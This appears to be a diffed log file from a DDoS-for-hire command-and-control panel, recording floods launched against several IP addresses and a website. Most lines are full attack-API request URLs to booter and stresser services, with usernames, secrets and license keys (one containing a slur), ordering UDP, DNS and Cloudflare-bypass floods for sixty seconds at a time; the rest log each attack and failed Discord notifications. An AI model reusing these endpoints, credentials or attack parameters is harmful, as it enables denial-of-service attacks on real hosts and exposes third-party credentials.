+2024/12/10 16:42:11 [ATTACK] Sending request to: https://yuze-api.xyz/api/attack?username=x2u&secret=x2uisop$30&host=70.70.70.36&port=53&time=60&method=!udp
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://mythicalstressapi.net/?key=3ichqv9ulnq8lp62ylx6qi3tgyl5mh&host=70.70.70.36&port=53&time=60&method=UDPRAW
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://aggu.spacey.sh/aggu/api?username=saturned&key=saturned&host=70.70.70.36&port=53&time=60&method=udp-bypass - Get "https://aggu.spacey.sh/aggu/api?username=saturned&key=saturned&host=70.70.70.36&port=53&time=60&method=udp-bypass": dial tcp: lookup aggu.spacey.sh: no such host
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://akarui.fyi/api/attack?username=sins&key=sins@gg$$$&host=70.70.70.36&port=53&time=60&method=udp
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://api.eternalproxy.xyz/api/attack?username=stopbegs&secret=snowy&host=70.70.70.36&port=53&time=60&method=udp
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://akarui.fyi/api/attack?username=sins&key=sins@gg$$$&host=70.70.70.36&port=53&time=60&method=udp
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://crtz.top/api/attack?username=chefe&secret=chefeapi09&host=70.70.70.36&port=53&time=60&method=UDPDROP
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://api.eternalproxy.xyz/api/attack?username=stopbegs&key=snowy&host=70.70.70.36&port=53&time=60&method=udp
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://aetherapi.com/api/attack?username=begs&secret=balls&host=70.70.70.36&port=53&time=60&method=api-udp
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://crtz.top/api/attack?username=chefe&secret=chefeapi09&host=70.70.70.36&port=53&time=60&method=udp
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://api.frosty.rip/kittybooter/api/v1/attack?license=saturnednigga&host=70.70.70.36&port=53&time=60&method=dns
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://api.frosty.rip/rocky/api/v1/attack?license=saturnednigga&host=70.70.70.36&port=53&time=60&method=dns
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://api.eternalproxy.xyz/api/attack?username=stopbegs&secret=stopbegs&host=70.70.70.36&port=53&time=60&method=udp
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://wrldsecurity.net/api/attack?username=pathc2api&secret=643t5ge4336y3467y34&host=70.70.70.36&port=53&duration=60&method=UDP
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://api.kaitenc2.de/api/fdd7d1243c4105b2/attack?target=70.70.70.36&port=53&duration=60&method=udp
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://api.kaitenc2.de/api/attack?username=josh&password=balls&target=70.70.70.36&port=53&duration=60&method=.udp
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://apisystem.herios-stress.xyz/api/attack?username=toring&key=tsukinetworks&host=70.70.70.36&port=53&duration=60&method=udpplain - Get "https://apisystem.herios-stress.xyz/api/attack?username=toring&key=tsukinetworks&host=70.70.70.36&port=53&duration=60&method=udpplain": tls: failed to verify certificate: x509: certificate signed by unknown authority
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://apisystem.herios-stress.xyz/api/attack?username=whosdior&key=changeme&host=70.70.70.36&port=53&time=60&method=dns - Get "https://apisystem.herios-stress.xyz/api/attack?username=whosdior&key=changeme&host=70.70.70.36&port=53&time=60&method=dns": tls: failed to verify certificate: x509: certificate signed by unknown authority
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://api.jetstress.su/?token=NQV083R2WjJCfYmXd2idvY&host=70.70.70.36&port=53&time=60&method=udp-a2s - Get "https://api.jetstress.su/?token=NQV083R2WjJCfYmXd2idvY&host=70.70.70.36&port=53&time=60&method=udp-a2s": dial tcp: lookup api.jetstress.su: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:42:11 [ATTACK] Sending request to: http://93.123.85.53/api.php?key=flshhhh&host=70.70.70.36&port=53&time=60&method=UDP
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=123vts&host=70.70.70.36&port=53&time=60&method=gudp - Get "https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=123vts&host=70.70.70.36&port=53&time=60&method=gudp": dial tcp: lookup theeyeapi.unhittable.gg: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://theeyeapi.unhittable.gg/api/attack?username=star&key=strrfrgg010&host=70.70.70.36&port=53&time=60&method=udp - Get "https://theeyeapi.unhittable.gg/api/attack?username=star&key=strrfrgg010&host=70.70.70.36&port=53&time=60&method=udp": dial tcp: lookup theeyeapi.unhittable.gg: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=123123&host=70.70.70.36&port=53&time=60&method=gudp - Get "https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=123123&host=70.70.70.36&port=53&time=60&method=gudp": dial tcp: lookup theeyeapi.unhittable.gg: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=changeme&host=70.70.70.36&port=53&time=60&method=udp - Get "https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=changeme&host=70.70.70.36&port=53&time=60&method=udp": dial tcp: lookup theeyeapi.unhittable.gg: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://wrldsecurity.ru/api/attack?username=projectworld&secret=543u7yrf893wu65t3&host=70.70.70.36&port=53&time=60&method=UDP
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://wrldsecurity.ru/api/attack?username=projectworld&secret=u85y7r438t76g4389u6t8y943586&host=70.70.70.36&port=53&time=60&method=UDP-PPS
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://wrldsecurity.ru/api/attack?username=projectworld&secret=u85y7r438t76g4389u6t8y943586&host=70.70.70.36&port=53&time=60&method=UDP
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://crucial-stress.us/api/start?user=stopbegs&key=stopbegs12345&target=70.70.70.36&port=53&time=60&method=UDP
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://api.spacevin.io/api/?token=bCvI7qNvWSTiwZZTWYEpYZ&host=70.70.70.36&port=53&time=60&method=udp - Get "https://api.spacevin.io/api/?token=bCvI7qNvWSTiwZZTWYEpYZ&host=70.70.70.36&port=53&time=60&method=udp": dial tcp: lookup api.spacevin.io: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://api.theeye.cloud/api/attack?username=jman&key=jman1234&&host=70.70.70.36&port=53&time=60&method=GUDP - Get "https://api.theeye.cloud/api/attack?username=jman&key=jman1234&&host=70.70.70.36&port=53&time=60&method=GUDP": dial tcp: lookup api.theeye.cloud: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://api.theeye.cloud/api/attack?username=jman&key=jman1234&&host=70.70.70.36&port=53&time=60&method=GUDP - Get "https://api.theeye.cloud/api/attack?username=jman&key=jman1234&&host=70.70.70.36&port=53&time=60&method=GUDP": dial tcp: lookup api.theeye.cloud: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:45:27 New Attack (API)!
+Username: root
+Target: 70.70.70.36
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2025/01/20 08:26:07 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2025/01/20 08:26:07 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/20 08:33:26 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2025/01/20 08:33:26 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/20 08:33:26 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2025/01/20 08:33:27 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/20 08:33:27 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2025/01/20 08:33:27 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/20 08:33:27 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2025/01/20 08:33:28 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/20 08:33:28 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2025/01/20 08:33:28 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/20 08:33:28 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2025/01/20 08:33:28 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/20 09:02:15 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2025/01/20 09:02:16 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/21 18:19:27 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/21 18:19:28 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/21 18:20:03 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/21 18:20:03 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/21 18:20:04 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/21 18:20:04 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/21 18:20:04 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/21 18:20:04 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/21 18:20:04 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/21 18:20:04 [ATTACK] Sending request to: https://example.com/api/attack?host=70.70.70.40&port=53&time=60
+2025/01/21 18:20:04 [ATTACK] https://example.com/api/attack?host=70.70.70.40&port=53&time=60 response: <!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+2025/01/21 18:20:04 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/21 18:20:04 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/21 18:20:04 [ATTACK] Sending request to: https://example.com/api/attack?host=70.70.70.40&port=53&time=60
+2025/01/21 18:20:04 [ATTACK] https://example.com/api/attack?host=70.70.70.40&port=53&time=60 response: <!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+2025/01/21 18:20:04 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/21 18:36:57 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/21 18:36:58 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/25 16:33:22 New Attack (C2)!
+Username: root
+Target: 97.98.65.7
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2025/01/25 16:33:23 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/25 16:33:23 [INFO] Attack information sent to user interface
+2025/01/25 16:38:49 New Attack (C2)!
+Username: root
+Target: https://alienmodz.com/
+Port: 443
+Time: 60
+Method: cloudflare
+----------------------
+2025/01/25 16:38:50 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/25 16:38:50 [INFO] Attack information sent to user interface
+2025/01/25 16:42:10 New Attack (C2)!
+Username: root
+Target: https://alienmodz.com/
+Port: 443
+Time: 60
+Method: cloudflare
+----------------------
+2025/01/25 16:42:10 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/25 16:42:10 [INFO] Attack information sent to user interface
+2025/01/25 16:43:00 New Attack (C2)!
+Username: root
+Target: https://alienmodz.com/
+Port: 443
+Time: 60
+Method: cloudflare
+----------------------
+2025/01/25 16:43:00 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/25 16:43:00 [INFO] Attack information sent to user interface
+2025/01/29 19:45:50 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/29 19:45:51 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/29 19:49:48 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/29 19:49:49 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/29 19:50:39 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/29 19:50:39 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/29 19:53:00 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/29 19:53:00 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/29 20:01:09 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/29 20:01:09 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/29 20:04:45 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/29 20:04:46 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/29 20:07:49 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/29 20:07:50 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/29 20:09:13 New Attack (API)!
+Username: root
+Target: 97.98.65.7
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/29 20:09:13 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/29 20:09:38 New Attack (API)!
+Username: root
+Target: 97.98.65.7
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/29 20:09:38 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/29 20:09:43 New Attack (API)!
+Username: root
+Target: 97.98.65.7
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/29 20:09:43 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/29 20:21:07 New Attack (API)!
+Username: root
+Target: 97.98.65.7
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/29 20:21:08 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/29 20:21:08 New Attack (API)!
+Username: root
+Target: 97.98.65.7
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/29 20:21:08 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/29 20:21:08 New Attack (API)!
+Username: root
+Target: 97.98.65.7
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/29 20:21:08 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/29 20:21:09 New Attack (API)!
+Username: root
+Target: 97.98.65.7
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/29 20:21:09 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/01/29 20:24:43 New Attack (API)!
+Username: root
+Target: 97.98.65.7
+Port: 53
+Time: 60
+Method: home
+----------------------
+2025/01/29 20:24:43 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/02/01 09:18:45 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2025/02/01 09:18:46 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/02/01 09:19:23 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2025/02/01 09:19:23 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/02/01 09:19:23 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2025/02/01 09:19:24 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/02/01 09:19:24 New Attack (API)!
+Username: root
+Target: 70.70.70.40
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2025/02/01 09:19:24 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/02/01 11:25:38 New Attack (C2)!
+Username: root
+Target: 97.98.65.7
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2025/02/01 11:25:39 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/02/01 11:25:39 [INFO] Attack information sent to user interface
+2025/02/01 11:26:19 New Attack (C2)!
+Username: root
+Target: 97.98.65.7
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2025/02/01 11:26:20 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/02/01 11:26:20 [INFO] Attack information sent to user interface
+2025/02/01 11:27:12 New Attack (C2)!
+Username: root
+Target: 97.98.65.7
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2025/02/01 11:27:12 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/02/01 11:27:12 [INFO] Attack information sent to user interface
+2025/02/01 11:29:08 New Attack (C2)!
+Username: root
+Target: 97.98.65.7
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2025/02/01 11:29:09 failed to send Discord message: Post "YOUR_DISCORD_WEBHOOK_URL": unsupported protocol scheme ""
+2025/02/01 11:29:09 [INFO] Attack information sent to user interface
